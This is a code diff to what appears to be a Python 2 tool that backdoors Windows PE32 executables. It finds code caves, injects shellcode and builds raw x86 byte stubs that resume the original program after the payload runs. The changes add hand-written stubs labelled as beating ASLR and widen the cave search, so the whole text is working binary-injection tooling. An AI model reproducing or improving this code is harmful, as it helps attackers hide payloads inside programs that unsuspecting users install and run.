@@ -232,10 +232,10 @@ op_codes = {'0x0100': 2, '0x0101': 2, '0x0102': 2, '0x0103': 2,
             '0x8965': 3, '0xFF15': 6, '0x8b4e': 3, '0x8b46': 3,
             '0x8b76': 3, '0x8915': 6, '0x8b56': 3, '0x83f9': 3,
             '0x81ec': 6, '0x837d': 4, '0x8b5d': 3, '0x8b75': 3,
-            '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2,
+            '0x8b7d': 3, '0x83fe': 3, '0x8bff': 2, '0x83c4': 3,
             '0x83ec': 3, '0x8bec': 2, '0x8bf6': 2, '0x85c0': 2,
             '0x33c0': 2, '0x33c9': 2, '0x89e5': 2, '0x89ec': 3,
-            '0xc70424': 7, '0xc9': 1,
+            '0xc70424': 7, '0xc9': 1, 
             '0xff1410': 3, '0xff1490': 3, '0xff1450': 3,
             '0xe8': 5, '0x68': 5, '0xe9': 5,
             '0xbf': 5, '0xbe': 5,
@@ -596,13 +596,12 @@ def pe32_entry_instr(TrackingAddress, fileItems):
     #for i, byte in enumerate(initial_instr_set):
     #    print i, ByteToHex(byte)
     f.seek(fileItems['LocOfEntryinCode'])
-
+    #print hex(fileItems['LocOfEntryinCode'])
     count = 0
     loop_count = 0
     ImpList = []
     while True:
         InstrSets = {}
-        fileItems['VirtualStartingPoint']
         found_value = False
         for i in range(1, 5):
             f.seek(fileItems['LocOfEntryinCode'] + count)
@@ -619,7 +618,7 @@ def pe32_entry_instr(TrackingAddress, fileItems):
                 #print i, hex(CurrInstr)
             elif i == 4:
                 CurrInstr = struct.unpack('!I', f.read(i))[0]
-                # print i, hex(CurrInstr)
+                #print i, hex(CurrInstr)
             if hex(CurrInstr) in op_codes:
                 #print hex(CurrInstr)
                 found_value = True
@@ -746,52 +745,113 @@ def resume_execution_32(ImpList):
                 print "single opcode, no instruction"
 
         compliment_one, compliment_two = ones_compliment()
-
+        #print hex(fileItems['VirtualStartingPoint'])
         if OpCode == int('e8', 16):  # Call instruction
-            print "You might have issues running this on a x64 system."
-            print "Test it before deploying!"
+            print "CALL for the initial instruction"
+            # Let's beat ASLR :D
+            resumeExe += "\xb8"
+            # include new section buffer in this in future
+            aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
+                                 fileItems['JMPtoCodeAddress'] +
+                                 len(shellcode) + len(resumeExe)+500)
+            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
             resumeExe += struct.pack('=B', int('E8', 16))  # call
             resumeExe += "\x00"*4
             # POP ECX to find location
             resumeExe += struct.pack('=B', int('59', 16))
-            # add ECX,10 push ECX
-            # Will need to build an ASM routine to beat ASLR
-            resumeExe += "\x83\xC1\x10\x51"
-            resumeExe += "\x05"
+            resumeExe += "\x2b\xc1"  # sub eax,ecx
+            resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
+            resumeExe += "\x77\x12"  # JA (14)
+            resumeExe += "\x83\xC1\x15"  # ADD ECX, 15
+            resumeExe += "\x51"
+            resumeExe += "\xb8"  # Mov EAX ..
             call_addr = (fileItems['VirtualStartingPoint'] +
                          instruction + 5)
             resumeExe += struct.pack('<I', call_addr)
-            resumeExe += "\xff\xe0"
-            resumeExe += "\x90"*4
-            resumeExe += "\x25"          #
-            resumeExe += compliment_one  #
-            resumeExe += "\x25"          # To zero eax
-            resumeExe += compliment_two  #
-            resumeExe += "\x05"  # ADD
+            resumeExe += "\xff\xe0"  # JMP EAX
+            resumeExe += "\xb8"  # ADD
             resumeExe += struct.pack('<I', item[3])
-            resumeExe += "\x50\xc3\x90\x90"  # PUSH EAX,RETN, NOPS*4
+            resumeExe += "\x50\xc3"  # PUSH EAX,RETN
+            resumeExe += "\xe8\x00\x00\x00\x00"
+            resumeExe += "\x59"
+            resumeExe += "\xb8"
+            # Need to add buffer here.
+            aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
+                                 fileItems['JMPtoCodeAddress'] +
+                                 len(shellcode) + len(resumeExe)+3)
+            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
+            resumeExe += "\x2b\xc8"
+            resumeExe += "\x81\xf9\x00\x00\x00\x0f"
+            resumeExe += "\x77\x11"
+            resumeExe += "\xb8"
+            resumeExe += struct.pack('<I', item[3])
+            resumeExe += "\x03\xc1"
+            resumeExe += "\x50"
+            resumeExe += "\xb8"
+            resumeExe += struct.pack("<I", (fileItems['VirtualStartingPoint'] +
+                                            instruction+5))
+            resumeExe += "\x03\xc1"
+            resumeExe += "\x50"
+            resumeExe += "\xc3"
+            resumeExe += "\xb8"
+            resumeExe += struct.pack('<I', 0xffffffff - item[3] + 1)
+            resumeExe += "\x2b\xc8"
+            resumeExe += "\x51"
+            resumeExe += "\x81\xc1"
+            resumeExe += struct.pack("<I", instruction)
+            resumeExe += "\x51"
+            resumeExe += "\xc3"
             ReturnTrackingAddress = item[3]
             return ReturnTrackingAddress, resumeExe
 
         elif OpCode in jump_codes:
+            print "JMP for initial instruction"
+            #Let's beat ASLR
+            resumeExe += "\xb8"
+            aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
+                                 fileItems['JMPtoCodeAddress'] +
+                                 len(shellcode) + len(resumeExe)+500)
+            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
             resumeExe += struct.pack('=B', int('E8', 16))  # call
             resumeExe += "\x00"*4
             # POP ECX to find location
             resumeExe += struct.pack('=B', int('59', 16))
-            #add ECX,10 push ECX
-            resumeExe += "\x83\xC1\x16\x51"
-            resumeExe += "\x25"          #
-            resumeExe += compliment_one  #
-            resumeExe += "\x25"          # To zero eax
-            resumeExe += compliment_two  #
-            resumeExe += "\x05"  # ADD
+            resumeExe += "\x2b\xc1"  # sub eax,ecx
+            resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
+            resumeExe += "\x77\x0b"  # JA (14)
+            resumeExe += "\x83\xC1\x16"
+            resumeExe += "\x51"
+            resumeExe += "\xb8"  # Mov EAX ..
             if OpCode is int('ea', 16):  # jmp far
                 resumeExe += struct.pack('<BBBBBB', ImpValue)
             elif ImpValue > 429467295:
                 resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
             else:
                 resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
-            resumeExe += "\x50\xc3\x90\x90\x90\x90"  # PUSH EAX,RETN, NOPS*4
+            resumeExe += "\x50\xc3"  # Push EAX, RETN
+            resumeExe += "\xe8\x00\x00\x00\x00"
+            resumeExe += "\x59"
+            resumeExe += "\xb8"
+            # Need to add appended code cave buffer here
+            aprox_loc_wo_alsr = (fileItems['VirtualStartingPoint'] +
+                                 fileItems['JMPtoCodeAddress'] +
+                                 len(shellcode) + len(resumeExe)+3)
+            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
+            resumeExe += "\x2b\xc8"
+            resumeExe += "\x81\xf9\x00\x00\x00\x0f"
+            resumeExe += "\x77\x09"
+            resumeExe += "\xb8"
+            resumeExe += struct.pack("<I", (fileItems['VirtualStartingPoint'] +
+                                            instruction + instr_length+1))
+            resumeExe += "\x03\xc1"
+            resumeExe += "\x50"
+            resumeExe += "\xc3"
+            resumeExe += "\xb8"
+            resumeExe += struct.pack('<I', (0xffffffff -
+                                            fileItems['VirtualStartingPoint'] -
+                                            instruction - 1))
+            resumeExe += "\x2b\xc8"
+            resumeExe += "\x51\xc3"
             ReturnTrackingAddress = item[3]
             return ReturnTrackingAddress, resumeExe
 
@@ -1134,9 +1194,9 @@ def find_all_caves(fileItems, shellcode_length):
 def find_cave(fileItems, shellcode_length):
     """This function finds all code caves, allowing the user
     to pick the cave for injecting shellcode."""
+    SIZE_CAVE_TO_FIND = shellcode_length + 30
     print "Looking for caves that will fit a shellcode "\
-          "of %s length\n" % shellcode_length
-    SIZE_CAVE_TO_FIND = shellcode_length
+          "of %s length\n" % SIZE_CAVE_TO_FIND
     Tracking = 0
     count = 0
     caveTracker = []
